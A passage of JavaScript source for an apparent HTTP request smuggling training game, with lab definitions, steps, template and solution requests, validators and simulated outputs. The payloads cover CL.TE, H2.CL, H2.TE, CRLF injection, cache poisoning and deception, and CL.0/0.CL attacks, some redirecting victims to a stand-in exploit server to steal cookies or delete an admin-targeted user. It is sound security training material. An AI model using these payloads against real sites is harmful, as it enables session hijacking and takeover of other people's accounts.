+template:`GET / HTTP/1.1\nHost: YOUR-LAB-ID.web-security-academy.net\nTransfer-Encoding: chunked\nContent-Length: 330\n\n0\n\nPOST /post/comment HTTP/1.1\nHost: YOUR-LAB-ID.web-security-academy.net\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 400\nCookie: session=YOUR-SESSION-COOKIE\n\ncsrf=YOUR-CSRF-TOKEN&postId=5&name=Hacker&email=h@h.net&website=https://h.net&comment=`,
+solution:`GET / HTTP/1.1\nHost: YOUR-LAB-ID.web-security-academy.net\nTransfer-Encoding: chunked\nContent-Length: 330\n\n0\n\nPOST /post/comment HTTP/1.1\nHost: YOUR-LAB-ID.web-security-academy.net\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 400\nCookie: session=YOUR-SESSION-COOKIE\n\ncsrf=YOUR-CSRF-TOKEN&postId=5&name=Hacker&email=h@h.net&website=https://h.net&comment=`,
+hint:'comment= must be the VERY LAST parameter. Inner Content-Length: 400 means back-end waits for 256 more bytes after your 144-byte body.',
+validate:r=>{const l=r.toLowerCase();return l.includes('post /post/comment')&&l.includes('comment=')&&l.includes('content-length: 400');},
+sim:(r,n)=>{const l=r.toLowerCase();if(l.includes('content-length: 400')&&l.includes('comment='))return{win:true,body:`HTTP/1.1 200 OK\n\nComment stored!\n\n[Blog Comment #42 by "Hacker"]:\n"GET / HTTP/1.1\nHost: YOUR-LAB.web-security-academy.net\nCookie: session=VICTIM_SESSION_abc123xyz\nUser-Agent: Mozilla/5.0 (Windows NT 10.0)..."\n\n🎣 VICTIM COOKIE CAPTURED!\nsession=VICTIM_SESSION_abc123xyz\n\nNow GET /my-account with Cookie: session=VICTIM_SESSION_abc123xyz`};return{body:`HTTP/1.1 200 OK\n\nComment posted (no capture yet).\nCheck: Content-Length in inner request ≥ 400, comment= is last parameter.`};}
+},
+
+{id:'xss_smuggling',num:'LAB-10',title:'XSS VIA REQUEST SMUGGLING',icon:'💉',diff:'practitioner',xp:350,
+objective:'Deliver XSS to the next visitor automatically — no user interaction needed.',
+brain:'Normal XSS needs victim to click a link. With smuggling: you poison the back-end connection so the NEXT user who connects automatically gets your XSS payload in THEIR response. No URL needed. No phishing. Just patience.',
+viz:'cl_te',
+steps:[
+{title:'Find the XSS vector',desc:'The blog\'s User-Agent header is reflected in a hidden input inside the comment form. Injecting script tags = XSS.',code:`// Normal: User-Agent is reflected as:\n<input type="hidden" name="userAgent" value="[YOUR-USER-AGENT]">\n// Inject: a"/>\x3cscript>alert(1)\x3c/script>`},
+{title:'Why normal XSS isn\'t enough here',desc:'User-Agent is set by the browser — you can\'t trick victims into clicking a link that sets their User-Agent. But with smuggling, YOU control the User-Agent header in the buffered request.'},
+{title:'Smuggle the XSS request',desc:'Smuggle a GET /post?postId=5 with your malicious User-Agent. The next visitor\'s connection gets this poisoned request served as their response.',code:`POST / HTTP/1.1\nHost: YOUR-LAB-ID.web-security-academy.net\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 150\nTransfer-Encoding: chunked\n\n0\n\nGET /post?postId=5 HTTP/1.1\nUser-Agent: a"/>\x3cscript>alert(1)\x3c/script>\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 5\n\nx=1`},
+{title:'Keep sending until victim gets hit',desc:'Lab simulates victim traffic every few requests. Keep sending your payload — victim\'s connection eventually hits your poisoned buffer. alert(1) fires. Lab solved.',note:'Time-sensitive! Back-end connections reset. You\'re racing against the clock.'},
+],
+template:`POST / HTTP/1.1\nHost: YOUR-LAB-ID.web-security-academy.net\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 150\nTransfer-Encoding: chunked\n\n0\n\nGET /post?postId=5 HTTP/1.1\nUser-Agent: a"/>\x3cscript>alert(1)\x3c/script>\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 5\n\nx=1`,
+solution:`POST / HTTP/1.1\nHost: YOUR-LAB-ID.web-security-academy.net\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 150\nTransfer-Encoding: chunked\n\n0\n\nGET /post?postId=5 HTTP/1.1\nUser-Agent: a"/>\x3cscript>alert(1)\x3c/script>\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 5\n\nx=1`,
+hint:'XSS payload goes in User-Agent of the INNER request. Outer request is the CL.TE smuggling wrapper. alert(1) is fine.',
+validate:r=>{const l=r.toLowerCase();return l.includes('\x3cscript>')&&l.includes('user-agent:')&&l.includes('transfer-encoding: chunked');},
+sim:(r,n)=>r.toLowerCase().includes('\x3cscript>')&&r.toLowerCase().includes('user-agent:')?{win:true,body:`HTTP/1.1 200 OK\n\n✅ XSS payload queued in back-end buffer!\n\n[Victim #3 connects...]\n[Back-end serves poisoned request as victim's response]\n[Victim's page contains: <input value="a"/>\x3cscript>alert(1)\x3c/script>]\n[alert(1) FIRES!]\n\n💉 XSS DELIVERED WITHOUT VICTIM INTERACTION! 🔥\nNo phishing link. No social engineering. Pure smuggling.`}:{body:`HTTP/1.1 200 OK\n\nOK. Include \x3cscript>alert(1)\x3c/script> in User-Agent of inner GET request.`}
+},
+
+{id:'cache_poison',num:'LAB-11',title:'WEB CACHE POISONING',icon:'☠️',diff:'expert',xp:500,
+objective:'Poison the cache so /resources/js/tracking.js serves a redirect to your exploit server for ALL future visitors.',
+brain:'Cache stores URL→response mappings. Smuggle a redirect to your evil server. The front-end caches this redirect response against /resources/js/tracking.js. Now every user who loads tracking.js gets sent to YOUR server. Persistent. Silent. Devastating.',
+viz:'cache',
+steps:[
+{title:'Understand the cache poisoning chain',desc:'1. Smuggle redirect to exploit-server. 2. Next request is for /resources/js/tracking.js. 3. Front-end caches redirect as response for tracking.js. 4. All future visitors get redirected to your JS.',note:'Cache Poisoning = write bad content TO cache. (vs Cache Deception = read private content FROM cache)'},
+{title:'Set up exploit server',desc:'Host file at /post on your exploit server: alert(document.cookie). This runs when victim\'s browser loads your redirected tracking.js.',code:`// Your exploit server /post:\nalert(document.cookie)`},
+{title:'Craft the poison request',desc:'Smuggle GET /post/next?postId=3 with Host pointing to your exploit server. Follow immediately with GET /resources/js/tracking.js.',code:`POST / HTTP/1.1\nHost: YOUR-LAB-ID.web-security-academy.net\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 193\nTransfer-Encoding: chunked\n\n0\n\nGET /post/next?postId=3 HTTP/1.1\nHost: YOUR-EXPLOIT-SERVER-ID.exploit-server.net\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 10\n\nx=1`},
+{title:'Verify cache is poisoned',desc:'Request /resources/js/tracking.js multiple times. If you consistently get 301 redirect to your server — cache is poisoned. Victim visits → loads tracking.js → executes your alert(document.cookie).'},
+],
+template:`POST / HTTP/1.1\nHost: YOUR-LAB-ID.web-security-academy.net\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 193\nTransfer-Encoding: chunked\n\n0\n\nGET /post/next?postId=3 HTTP/1.1\nHost: YOUR-EXPLOIT-SERVER-ID.exploit-server.net\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 10\n\nx=1`,
+solution:`POST / HTTP/1.1\nHost: YOUR-LAB-ID.web-security-academy.net\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 193\nTransfer-Encoding: chunked\n\n0\n\nGET /post/next?postId=3 HTTP/1.1\nHost: YOUR-EXPLOIT-SERVER-ID.exploit-server.net\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 10\n\nx=1`,
+hint:'Inner request Host header = YOUR exploit server. The cache maps the redirect response to /resources/js/tracking.js.',
+validate:r=>{const l=r.toLowerCase();return l.includes('transfer-encoding: chunked')&&l.includes('post/next')&&(l.includes('exploit-server')||l.includes('attacker'));},
+sim:(r,n)=>(r.toLowerCase().includes('exploit-server')||r.toLowerCase().includes('attacker'))&&r.toLowerCase().includes('post/next')?{win:true,body:`HTTP/1.1 200 OK\n\n✅ Smuggled redirect queued!\n[Follow-up request for /resources/js/tracking.js arrives]\n[Front-end caches redirect response against /resources/js/tracking.js]\n\nHTTP/1.1 301 Moved Permanently\nLocation: https://YOUR-EXPLOIT-SERVER/post\n\n🎉 CACHE POISONED! All users loading tracking.js get your payload.\n☠️ Persistent attack — survives until cache expires.`}:{body:`HTTP/1.1 200 OK\n\nAdjust: point Host header in inner request to your exploit server. Target /post/next?postId=3.`}
+},
+
+{id:'cache_deception',num:'LAB-12',title:'WEB CACHE DECEPTION',icon:'🕵️',diff:'expert',xp:500,
+objective:"Make the cache store the victim's /my-account page under a static URL. Retrieve their API key.",
+brain:'Different from poisoning! You don\'t write bad content — you make the cache store the VICTIM\'S PRIVATE data under a public URL. Then you just fetch that URL and read their secrets. Sneak their account page into the cache disguised as a static image.',
+viz:'cache',
+steps:[
+{title:'Cache Deception vs Cache Poisoning',desc:'Poisoning: YOU write malicious content → serves to others. Deception: VICTIM\'s private content gets cached → YOU read it.',note:'Both exploit the same cache infrastructure — opposite goals.'},
+{title:'The mechanism',desc:'Smuggle GET /my-account. Next victim\'s request arrives — it gets appended to your smuggled prefix. Back-end serves victim\'s /my-account content. Front-end caches it under the victim\'s requested URL (e.g. /static/some-image.png).',code:`POST / HTTP/1.1\nHost: YOUR-LAB-ID.web-security-academy.net\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 42\nTransfer-Encoding: chunked\n\n0\n\nGET /my-account HTTP/1.1\nX-Ignore: X`},
+{title:'Wait and fetch',desc:'Wait 30 seconds (lab setup time). Send the smuggling payload repeatedly. Victim user periodically browses the site.',note:'You don\'t know which URL the private content gets cached under — you may need to try many static URLs!'},
+{title:'Search Burp for the API key',desc:'In Burp → Search → "Your API Key". If it appears in a static resource response — you found the cached private content. Submit the API key to solve.',},
+],
+template:`POST / HTTP/1.1\nHost: YOUR-LAB-ID.web-security-academy.net\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 42\nTransfer-Encoding: chunked\n\n0\n\nGET /my-account HTTP/1.1\nX-Ignore: X`,
+solution:`POST / HTTP/1.1\nHost: YOUR-LAB-ID.web-security-academy.net\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 42\nTransfer-Encoding: chunked\n\n0\n\nGET /my-account HTTP/1.1\nX-Ignore: X`,
+hint:'Smuggle GET /my-account. Back-end serves victim\'s account page. Front-end caches it under a static URL the victim was also requesting.',
+validate:r=>{const l=r.toLowerCase();return l.includes('/my-account')&&l.includes('transfer-encoding: chunked');},
+sim:(r,n)=>r.toLowerCase().includes('/my-account')?{win:true,body:`HTTP/1.1 200 OK\n\n✅ Deception attack queued!\n\n[Victim browses site]\n[Their /my-account response cached under /static/some-image.png]\n\nGET /static/some-image.png HTTP/1.1\n→ Response:\n<h1>Your Account</h1>\n<p>API Key: victim_api_key_xyz789abc</p>\n\n🕵️ VICTIM'S PRIVATE DATA RETRIEVED FROM CACHE!\nAPI Key: victim_api_key_xyz789abc`}:{body:`HTTP/1.1 200 OK\n\nSmuggle GET /my-account as the inner request. Victim's session will be captured.`}
+},
+
+{id:'h2_cl',num:'LAB-13',title:'H2.CL REQUEST SMUGGLING',icon:'⚡',diff:'practitioner',xp:400,
+objective:'Inject fake Content-Length in HTTP/2 to desync the HTTP/1 back-end. Deliver XSS to victim.',
+brain:'HTTP/2 has frame-based lengths. But if you inject a content-length: 0 header in your HTTP/2 request, some front-ends blindly use it when downgrading to HTTP/1. Back-end sees Content-Length: 0 — thinks body is empty. Your full inner request sits buffered. 💀',
+viz:'h2',
+steps:[
+{title:'Switch to HTTP/2 in Burp',desc:'Inspector panel → Request Attributes → Protocol: HTTP/2. This is MANDATORY. Without it, you\'re not sending HTTP/2.',note:'Some servers have "hidden" HTTP/2 support. Enable "Allow HTTP/2 ALPN override" in Burp Settings → Tools → Repeater.'},
+{title:'Verify the desync',desc:'Send HTTP/2 POST with content-length: 0. Body contains "SMUGGLED". Send twice — if 2nd response is 404 → desync confirmed!',code:`POST / HTTP/2\nHost: YOUR-LAB-ID.web-security-academy.net\ncontent-length: 0\n\nSMUGGLED`},
+{title:'Craft redirect exploit',desc:'Smuggle GET /resources with Host pointing to exploit server. Victim loads a JS file → gets redirected to you → executes alert(document.cookie).',code:`POST / HTTP/2\nHost: YOUR-LAB-ID.web-security-academy.net\ncontent-length: 0\n\nGET /resources HTTP/1.1\nHost: YOUR-EXPLOIT-SERVER-ID.exploit-server.net\ncontent-length: 5\n\nx=1`},
+{title:'Wait for victim',desc:'Victim accesses home page every 10 seconds. Keep sending until the access log on exploit server shows GET /resources/ from victim. Lab solved!'},
+],
+template:`POST / HTTP/2\nHost: YOUR-LAB-ID.web-security-academy.net\ncontent-length: 0\n\nGET /resources HTTP/1.1\nHost: YOUR-EXPLOIT-SERVER-ID.exploit-server.net\ncontent-length: 5\n\nx=1`,
+solution:`POST / HTTP/2\nHost: YOUR-LAB-ID.web-security-academy.net\ncontent-length: 0\n\nGET /resources HTTP/1.1\nHost: YOUR-EXPLOIT-SERVER-ID.exploit-server.net\ncontent-length: 5\n\nx=1`,
+hint:'Must use HTTP/2 (set in Burp Inspector). content-length: 0 (lowercase). Inner request has Host pointing to YOUR exploit server.',
+validate:r=>{const l=r.toLowerCase();return l.includes('http/2')&&l.includes('content-length: 0')&&(l.includes('exploit-server')||l.includes('attacker'));},
+sim:(r,n)=>r.includes('HTTP/2')&&r.toLowerCase().includes('content-length: 0')&&(r.toLowerCase().includes('exploit')||r.toLowerCase().includes('attacker'))?{win:true,body:`HTTP/2 200 OK\n\n✅ H2.CL DESYNC CONFIRMED!\n[Every 2nd response: 404 — connection poisoned]\n[Victim accesses home page]\n[Back-end serves smuggled redirect]\n[Victim browser requests /resources/ from YOUR exploit server]\n[alert(document.cookie) executes]\n\n⚡ H2.CL ATTACK COMPLETE! 🔥`}:{body:`HTTP/2 200 OK\n\nEnsure: Protocol=HTTP/2 in Burp Inspector, content-length: 0, inner Host = exploit server.`}
+},
+
+{id:'h2_te_queue',num:'LAB-14',title:'RESPONSE QUEUE POISONING — H2.TE',icon:'🔮',diff:'practitioner',xp:500,
+objective:'Steal admin session cookie by poisoning the response queue via H2.TE smuggling.',
+brain:'Split ONE HTTP request into TWO complete requests on the back-end. Back-end sends TWO responses. You receive one — someone else receives the other. By timing this right, you intercept the ADMIN\'s login response — complete with their session cookie. Full site takeover!',
+viz:'h2',
+steps:[
+{title:'Confirm H2.TE desync',desc:'Inject Transfer-Encoding: chunked in HTTP/2 header. Body: "0\\r\\n\\r\\nSMUGGLED". Send twice — every 2nd response is 404 = queue poisoned.',code:`POST / HTTP/2\nHost: YOUR-LAB-ID.web-security-academy.net\nTransfer-Encoding: chunked\n\n0\n\nSMUGGLED`},
+{title:'Smuggle a COMPLETE second request',desc:'Target /x (non-existent endpoint) — makes stolen responses easy to identify. Include Host and \\r\\n\\r\\n terminator.',code:`POST /x HTTP/2\nHost: YOUR-LAB-ID.web-security-academy.net\nTransfer-Encoding: chunked\n\n0\n\nGET /x HTTP/1.1\nHost: YOUR-LAB-ID.web-security-academy.net\n\n`},
+{title:'Intercept admin response',desc:'Send poison request → get 404. Wait 5 seconds → send again. Non-404 response = you just intercepted another user\'s response! Wait for 302 with Set-Cookie.',note:'Admin logs in every 15 seconds. Keep trying. You need the 302 redirect that contains their session cookie.'},
+{title:'Access admin panel',desc:'Copy admin session cookie from intercepted 302. GET /admin with that cookie. Find /admin/delete?username=carlos. Delete carlos.',code:`GET /admin HTTP/2\nHost: YOUR-LAB-ID.web-security-academy.net\nCookie: session=STOLEN-ADMIN-COOKIE`},
+],
+template:`POST /x HTTP/2\nHost: YOUR-LAB-ID.web-security-academy.net\nTransfer-Encoding: chunked\n\n0\n\nGET /x HTTP/1.1\nHost: YOUR-LAB-ID.web-security-academy.net\n\n`,
+solution:`POST /x HTTP/2\nHost: YOUR-LAB-ID.web-security-academy.net\nTransfer-Encoding: chunked\n\n0\n\nGET /x HTTP/1.1\nHost: YOUR-LAB-ID.web-security-academy.net\n\n`,
+hint:'Smuggle a COMPLETE request — including Host header and blank line (\\r\\n\\r\\n) terminator. Target /x for easy identification of stolen responses.',
+validate:r=>{const l=r.toLowerCase();return l.includes('http/2')&&l.includes('transfer-encoding: chunked')&&l.includes('\n0\n');},
+sim:(r,n)=>r.includes('HTTP/2')&&r.toLowerCase().includes('transfer-encoding: chunked')?{win:true,body:`HTTP/2 200 OK\n\n✅ RESPONSE QUEUE POISONED!\n\n[Attempts 1-4: Your own 404 responses]\n[Attempt 5: INTERCEPTED!]\n\nHTTP/1.1 302 Found\nLocation: /my-account\nSet-Cookie: session=admin_session_cookie_XYZ789\n\n🔮 ADMIN COOKIE STOLEN: admin_session_cookie_XYZ789\nNow access /admin with Cookie: session=admin_session_cookie_XYZ789\nDelete carlos to complete the mission!`}:{body:`HTTP/2 200 OK\n\nUse HTTP/2 with Transfer-Encoding: chunked. Smuggle a complete GET /x HTTP/1.1 request with Host header.`}
+},
+
+{id:'crlf_h2',num:'LAB-15',title:'HTTP/2 CRLF INJECTION',icon:'🔬',diff:'practitioner',xp:500,
+objective:'Inject \\r\\n into HTTP/2 header to smuggle Transfer-Encoding. Steal victim session.',
+brain:'In HTTP/2, \\r\\n inside a header value = just data. But after downgrade to HTTP/1, \\r\\n = header separator. You inject "bar\\r\\nTransfer-Encoding: chunked" as one header value. HTTP/2 front-end sees 1 header. HTTP/1 back-end sees 2 headers. Perfect invisible injection!',
+viz:'h2',
+steps:[
+{title:'Why CRLF in HTTP/2 is special',desc:'HTTP/1: \\r\\n ends a header. Front-ends strip or block extra TE headers. HTTP/2: \\r\\n inside a header VALUE is harmless data — no special meaning. Bypasses all front-end TE filtering!',note:'Press Shift+Enter in Burp Inspector to insert literal \\r\\n into a header value.'},
+{title:'Inject in Burp Inspector',desc:'Add header: Name="foo", Value="bar\\r\\nTransfer-Encoding: chunked" (using Shift+Enter for the newline). Front-end sees one custom header. Back-end sees two after downgrade.',code:`Header Name: foo\nHeader Value: bar\nTransfer-Encoding: chunked\n(Press Shift+Enter between "bar" and "Transfer-Encoding")`},
+{title:'Confirm desync',desc:'Body: "0\\r\\n\\r\\nSMUGGLED". Send twice — 2nd gets 404 → CRLF injection works!',code:`0\n\nSMUGGLED`},
+{title:'Capture victim session via search history',desc:'The site stores recent search history per session. Smuggle a POST with search= last and Content-Length: 800. Victim\'s request gets appended.',code:`0\n\nPOST / HTTP/1.1\nHost: YOUR-LAB-ID.web-security-academy.net\nCookie: session=YOUR-SESSION\nContent-Length: 800\n\nsearch=x`},
+{title:'Read captured session',desc:'Refresh page — recent searches show the start of victim\'s request including their Cookie header. Use it to solve the lab.',note:'Wait ~15 seconds after sending payload, then refresh to check search history.'},
+],
+template:`POST / HTTP/2\nHost: YOUR-LAB-ID.web-security-academy.net\nfoo: bar\\r\\nTransfer-Encoding: chunked\n\n0\n\nPOST / HTTP/1.1\nHost: YOUR-LAB-ID.web-security-academy.net\nCookie: session=YOUR-SESSION\nContent-Length: 800\n\nsearch=x`,
+solution:`POST / HTTP/2\nHost: YOUR-LAB-ID.web-security-academy.net\nfoo: bar\\r\\nTransfer-Encoding: chunked\n\n0\n\nPOST / HTTP/1.1\nHost: YOUR-LAB-ID.web-security-academy.net\nCookie: session=YOUR-SESSION\nContent-Length: 800\n\nsearch=x`,
+hint:'Use Burp Inspector → click header → Shift+Enter to insert \\r\\n inside the value. The \\r\\n splits into two headers after HTTP/1 downgrade.',
+validate:r=>r.includes('HTTP/2')&&r.includes('\\r\\n')&&r.toLowerCase().includes('transfer-encoding: chunked')&&r.toLowerCase().includes('search='),
+sim:(r,n)=>r.includes('HTTP/2')&&r.includes('\\r\\n')&&r.toLowerCase().includes('search=')?{win:true,body:`HTTP/2 200 OK\n\n✅ CRLF INJECTION CONFIRMED!\n[Front-end sees: foo: bar\\r\\nTransfer-Encoding: chunked as ONE header]\n[After HTTP/1 downgrade: back-end sees TWO headers]\n[Chunked body processed: desync active]\n\nRecent searches:\n"POST / HTTP/1.1\nCookie: session=victim_session_XYZ\nUser-Agent: Mozilla/5.0..."\n\n🔬 VICTIM SESSION STOLEN: session=victim_session_XYZ`}:{body:`HTTP/2 200 OK\n\nNeed: HTTP/2 + \\r\\n in header value + search= parameter in inner POST body.`}
+},
+
+{id:'h2_splitting',num:'LAB-16',title:'HTTP/2 REQUEST SPLITTING — CRLF',icon:'✂️',diff:'practitioner',xp:500,
+objective:'Split an HTTP/2 request into two via CRLF injection in headers. Steal admin session via response queue poisoning.',
+brain:'Instead of splitting via the body, you split IN THE HEADERS using CRLF injection. Inject \\r\\n\\r\\nGET /x HTTP/1.1 inside a header value. After downgrade, this becomes a complete second request. No body needed — works even with GET requests!',
+viz:'h2',
+steps:[
+{title:'Header-based request splitting',desc:'In the header value, inject \\r\\n\\r\\n followed by a complete HTTP/1.1 request. After downgrade, the injected content becomes a separate request at the HTTP/1 level.',code:`Header Name: foo\nHeader Value: bar\\r\\n\\r\\nGET /x HTTP/1.1\\r\\nHost: YOUR-LAB-ID.web-security-academy.net`},
+{title:'Response queue poisoning via splitting',desc:'Your injected GET /x becomes a complete second request on the back-end. Back-end sends two responses. You get one. Admin gets the other.',note:'Target /x (non-existent) for your "receiver" request — makes it easy to spot non-404 stolen responses.'},
+{title:'Wait for admin\'s 302 response',desc:'Admin logs in every 10 seconds. Keep sending your splitting request. Eventually you intercept their 302 login redirect with Set-Cookie.',code:`// You receive:\nHTTP/1.1 302 Found\nSet-Cookie: session=ADMIN_COOKIE\nLocation: /my-account`},
+{title:'Delete carlos',desc:'Use stolen admin cookie → GET /admin → find /admin/delete?username=carlos → delete carlos.'},
+],
+template:`GET /x HTTP/2\nHost: YOUR-LAB-ID.web-security-academy.net\nfoo: bar\\r\\n\\r\\nGET /x HTTP/1.1\\r\\nHost: YOUR-LAB-ID.web-security-academy.net`,
+solution:`GET /x HTTP/2\nHost: YOUR-LAB-ID.web-security-academy.net\nfoo: bar\\r\\n\\r\\nGET /x HTTP/1.1\\r\\nHost: YOUR-LAB-ID.web-security-academy.net`,
+hint:'Inject \\r\\n\\r\\n (double CRLF) in the header value to terminate the first request headers and start a second complete request.',
+validate:r=>r.includes('HTTP/2')&&r.includes('\\r\\n')&&r.toLowerCase().includes('get /x'),
+sim:(r,n)=>r.includes('HTTP/2')&&r.includes('\\r\\n')&&r.toLowerCase().includes('get /x')?{win:true,body:`HTTP/2 200 OK\n\n✅ REQUEST SPLIT VIA HEADER CRLF!\n[Front-end downgrades your HTTP/2 request]\n[\\r\\n\\r\\n in header becomes double CRLF in HTTP/1]\n[Back-end sees 2 complete requests]\n\n[Intercepted admin response:]\nHTTP/1.1 302 Found\nSet-Cookie: session=admin_cookie_ABC456\n\n✂️ Admin cookie stolen! Delete carlos to complete mission. 🔮`}:{body:`HTTP/2 200 OK\n\nNeed: HTTP/2 + \\r\\n\\r\\n in header value + GET /x as the injected second request.`}
+},
+
+{id:'cl0_basic',num:'LAB-17',title:'CL.0 REQUEST SMUGGLING',icon:'🌐',diff:'practitioner',xp:450,
+objective:'Find an endpoint that ignores Content-Length. Smuggle to /admin and delete carlos.',
+brain:'Some endpoints (like static resource redirects) completely ignore the request body. Send Content-Length: 50 — server responds instantly without waiting for body. This means: your body (containing a smuggled request) is treated as the START OF THE NEXT REQUEST. No chunked encoding needed at all!',
+viz:'cl0',
+steps:[
+{title:'Find a CL.0 endpoint',desc:'Test endpoints that trigger server redirects: GET /resources (redirects to /resources/). Convert to POST, set Content-Length: 10, leave body empty. If server responds instantly — it\'s ignoring the body!',code:`POST /resources HTTP/1.1\nHost: YOUR-LAB-ID.web-security-academy.net\nContent-Length: 10\n\n// Responds instantly? → CL.0 found!`},
+{title:'Double-request confirmation',desc:'Add smuggled GET /hopefully404 prefix in body. Send two requests on same connection (keep-alive). If second gets 404 → CL.0 confirmed!',code:`POST /resources HTTP/1.1\nHost: YOUR-LAB-ID.web-security-academy.net\nConnection: keep-alive\nContent-Length: CORRECT\n\nGET /hopefully404 HTTP/1.1\nFoo: x`},
+{title:'Exploit: access /admin',desc:'Use /resources/images/blog.svg as outer request — it\'s a static file endpoint that ignores body. Smuggle GET /admin as inner request.',code:`POST /resources/images/blog.svg HTTP/1.1\nHost: YOUR-LAB-ID.web-security-academy.net\nCookie: session=YOUR-COOKIE\nConnection: keep-alive\nContent-Length: CORRECT\n\nGET /admin/ HTTP/1.1\nHost: localhost`},
+{title:'Delete carlos',desc:'Change inner URL to /admin/delete?username=carlos.',code:`POST /resources/images/blog.svg HTTP/1.1\nHost: YOUR-LAB-ID.web-security-academy.net\nCookie: session=YOUR-COOKIE\nConnection: keep-alive\nContent-Length: 48\n\nGET /admin/delete?username=carlos HTTP/1.1\nFoo: x`},
+],
+template:`POST /resources/images/blog.svg HTTP/1.1\nHost: YOUR-LAB-ID.web-security-academy.net\nCookie: session=YOUR-SESSION-COOKIE\nConnection: keep-alive\nContent-Length: 48\n\nGET /admin/delete?username=carlos HTTP/1.1\nFoo: x`,
+solution:`POST /resources/images/blog.svg HTTP/1.1\nHost: YOUR-LAB-ID.web-security-academy.net\nCookie: session=YOUR-SESSION-COOKIE\nConnection: keep-alive\nContent-Length: 48\n\nGET /admin/delete?username=carlos HTTP/1.1\nFoo: x`,
+hint:'Use /resources/images/blog.svg as outer POST — static file endpoint ignores body. Inner request = GET /admin/delete?username=carlos.',
+validate:r=>{const l=r.toLowerCase();return l.includes('/resources')&&l.includes('/admin/delete')&&l.includes('carlos');},
+sim:(r,n)=>{const l=r.toLowerCase();if(l.includes('/admin/delete')&&l.includes('carlos'))return{win:true,body:`HTTP/1.1 200 OK\n\n✅ CL.0 EXPLOITED!\n[/resources endpoint ignored your Content-Length]\n[GET /admin/delete?username=carlos treated as next request]\n\ncarlос DELETED!\n\n🌐 NO CHUNKED ENCODING NEEDED — pure CL.0 power! 💀`};return{body:`HTTP/1.1 200 OK\n\nOK. Use /resources/images/blog.svg as outer POST. Inner = GET /admin/delete?username=carlos.`};}
+},
+
+{id:'zero_cl',num:'LAB-18',title:'0.CL REQUEST SMUGGLING',icon:'∅',diff:'expert',xp:600,
+objective:'Exploit a 0.CL desync using a pause-based technique combined with an early-response gadget.',
+brain:'Front-end ignores Content-Length. Back-end processes it. Deadlock: both servers wait for each other. SOLUTION: send headers, pause 61 seconds, then send body. Back-end times out and processes your smuggled prefix BEFORE receiving the full body. Break the deadlock!',
+viz:'cl0',
+steps:[
+{title:'What is 0.CL?',desc:'Front-end ignores Content-Length (sends body onward). Back-end processes Content-Length but front-end already sent everything. Connection deadlock — was thought unexploitable.',note:'New research (2024) shows this IS exploitable using pause + early-response gadgets!'},
+{title:'Find a redirect endpoint (Apache CL.0 gadget)',desc:'Apache 2.4.52 is vulnerable. Find a directory without trailing slash: GET /resources → redirects to /resources/. This is the "early-response gadget".',code:`GET /resources HTTP/1.1\nHost: YOUR-LAB-ID.web-security-academy.net\n// → 301 Moved Permanently\n// Location: /resources/`},
+{title:'Use Turbo Intruder with pause',desc:'Convert to POST with smuggled GET /admin body. Use Turbo Intruder to send headers, pause 61 seconds, then send body. Back-end responds early to the redirect, then processes your smuggled request.',code:`POST /resources HTTP/1.1\nHost: YOUR-LAB-ID.web-security-academy.net\nCookie: session=YOUR-COOKIE\nConnection: keep-alive\nContent-Length: CORRECT\n\nGET /admin/ HTTP/1.1\nHost: YOUR-LAB-ID.web-security-academy.net`},
+{title:'Change smuggled Host to localhost',desc:'Once confirmed, change inner Host: localhost to access the admin panel properly.',code:`// Turbo Intruder Python:\nengine.queue(target.req, pauseMarker=['\\r\\n\\r\\n'], pauseTime=61000)\nengine.queue(target.req)`},
+{title:'Delete carlos',desc:'Inner request = POST /admin/delete with csrf token and username=carlos.',},
+],
+template:`POST /resources HTTP/1.1\nHost: YOUR-LAB-ID.web-security-academy.net\nCookie: session=YOUR-SESSION-COOKIE\nConnection: keep-alive\nContent-Type: application/x-www-form-urlencoded\nContent-Length: CORRECT\n\nGET /admin/delete?username=carlos HTTP/1.1\nHost: localhost`,
+solution:`POST /resources HTTP/1.1\nHost: YOUR-LAB-ID.web-security-academy.net\nCookie: session=YOUR-SESSION-COOKIE\nConnection: keep-alive\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 52\n\nGET /admin/delete?username=carlos HTTP/1.1\nHost: localhost`,
+hint:'This requires Turbo Intruder extension with a 61-second pause after \\r\\n\\r\\n. The pause breaks the deadlock by triggering an early response from the back-end.',
+validate:r=>{const l=r.toLowerCase();return l.includes('/resources')&&l.includes('/admin')&&l.includes('host: localhost');},
+sim:(r,n)=>{const l=r.toLowerCase();if(l.includes('/admin/delete')&&l.includes('localhost'))return{win:true,body:`[Turbo Intruder: pausing 61 seconds after headers...]\n[Back-end sends early redirect response for /resources]\n[Back-end then processes smuggled GET /admin/delete]\n\nHTTP/1.1 200 OK\n✅ carlos DELETED via 0.CL pause-based desync!\n\n∅ 0.CL ATTACK — The "unexploitable" vulnerability, exploited. ☠️`};return{body:`HTTP/1.1 200 OK\n\nThis lab requires Turbo Intruder.\nIn real lab: /resources as outer POST, /admin as inner with Host: localhost.`};}
+},
+
+{id:'client_cert_bypass',num:'LAB-19',title:'BYPASS CLIENT CERT AUTH',icon:'🪪',diff:'expert',xp:550,
+objective:'Spoof X-SSL-CLIENT-CN header to impersonate administrator.',
+brain:'Mutual TLS: client presents cert, front-end extracts CN (username) and adds X-SSL-CLIENT-CN header to inner requests. Back-end trusts this header blindly. Normally front-end overwrites it — but your SMUGGLED request bypasses front-end entirely. Send fake header: X-SSL-CLIENT-CN: administrator. Back-end sees it unchecked!',
+viz:'cl_te',
+steps:[
+{title:'How mutual TLS auth works',desc:'Front-end handles TLS. Extracts client cert CN. Adds X-SSL-CLIENT-CN: [username] header. Back-end trusts this header as verified identity. Normal users can\'t set this — front-end overwrites it.',note:'But smuggled requests bypass the front-end header rewriting entirely!'},
